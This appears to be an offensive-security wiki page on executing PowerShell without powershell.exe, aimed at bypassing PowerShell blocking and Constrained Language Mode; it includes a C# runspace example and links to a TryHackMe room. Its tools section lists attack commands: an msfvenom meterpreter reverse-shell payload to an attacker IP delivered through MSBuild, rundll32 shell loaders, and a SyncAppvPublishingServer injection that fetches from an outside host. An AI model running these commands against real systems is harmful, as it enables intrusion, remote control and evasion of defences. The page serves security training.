# Powershell Without Powershell.exe

## Theory

PowerShell.exe primarily serves as a graphical interface for handling input and output, while the core functionality resides in the managed DLL[ **System.Management.Automation.dll**](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation?view=powershellsdk-7.4.0). This DLL is responsible for creating and managing **runspaces**, which serve as isolated execution environments for PowerShell commands and scripts.

#### Runspace-Based Execution

Since [runspaces](https://learn.microsoft.com/en-us/powershell/scripting/developer/hosting/creating-runspaces?view=powershell-7.4) operate independently of **PowerShell.exe**, we can create a custom program to establish and control a runspace, allowing us to execute PowerShell code outside the standard PowerShell interface.

#### NoPowerShell: A Lightweight Alternative

Alternatively, projects like [**NoPowerShell**](https://github.com/bitsadmin/nopowershell) provide a way to execute PowerShell-like commands without relying on PowerShell.exe or System.Management.Automation.dll. Instead of creating runspaces, NoPowerShell implements common cmdlets directly in C#.

If you encounter a scenario where **PowerShell.exe is blocked** or [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) is enforced, but no strict application whitelisting is in place, alternative execution methods can still enable PowerShell execution.

## Practice

### Tools&#x20;

{% tabs %}
{% tab title="PowerLessShell" %}
[PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell.git) is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the PowerShell process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.

```bash
#Generate a malisious powershell script
v4resk@kali$ msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1

#Generate a .csproj with PowerLessShell
v4resk@kali$ python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj

#Execute it on the target with MSBuild.exe
C:\Users\thm> c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj
```
{% endtab %}

{% tab title="NoPowershell" %}
{% hint style="success" %}
NoPowerShell doesn't use`System.Management.Automation.dll` or RunSpaces, only native .NET libraries. **NoPowerShell** **directly implements cmdlet functionality**
{% endhint %}

[NoPowerShell](https://github.com/bitsadmin/nopowershell) is a tool implemented in C# which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms.

This .NET Framework 2 compatible binary can be loaded in Cobalt Strike to execute commands in-memory. An alternative usecase for NoPowerShell is to launch it as a DLL via rundll32.exe:&#x20;

```powershell
C:\Users\v4resk> rundll32 NoPowerShell.dll,main
```
{% endtab %}

{% tab title="PowerShdll" %}
We can load [PowerShdll](https://github.com/p3nt4/PowerShdll) with rundll32.exe to gain a shell

```bash
C:\Users\v4resk> rundll32.exe PowerShdll.dll,main
```
{% endtab %}

{% tab title="SyncAppvPublishingServer" %}
Windows 10 comes with SyncAppvPublishingServer.exe and SyncAppvPublishingServer.vbs that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```bash
C:\Users\v4resk> SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```
{% endtab %}
{% endtabs %}

#### Custom RunSpace Program

{% tabs %}
{% tab title="C#" %}
Here's a C# code snippet that demonstrates creating a custom PowerShell runspace to execute commands:

{% code title="RunspacePoc.cs" %}
```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main()
    {
        string command = "Write-Output 'Hello from PowerShell'";

        using (Runspace runspace = RunspaceFactory.CreateRunspace())
        {
            runspace.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript(command);

                foreach (var result in ps.Invoke())
                {
                    Console.WriteLine(result);
                }
            }
        }
    }
}
```
{% endcode %}

{% hint style="info" %}
To include it in your Windows Visual Studio project or compile it on Linux, locate the DLL on Windows systems at:

`C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management`
{% endhint %}

To compile this code on Unix-based systems, we can use the following [mono](https://www.mono-project.com/download/stable/#download-lin) command to include the `System.Management.Automation.dll`:

```bash
mono-csc RunspacePoc.cs -r:System.Management.Automation.dll
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/livingofftheland" %}

{% embed url="https://www.ired.team/offensive-security/code-execution/powershell-without-powershell" %}
